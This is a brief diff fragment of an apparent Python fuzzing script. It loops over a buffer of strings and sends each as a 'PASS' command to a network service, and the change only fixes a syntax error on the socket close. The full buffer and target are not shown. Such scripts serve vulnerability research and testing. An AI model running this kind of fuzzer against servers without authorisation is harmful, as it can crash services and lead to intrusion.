@@ -16,4 +16,4 @@ for string in buffer:
   s.recv(1024)  
   s.send('PASS ' + string + '\r\n')  
   s.send('QUIT\r\n')  
-  s.close(
+  s.close()
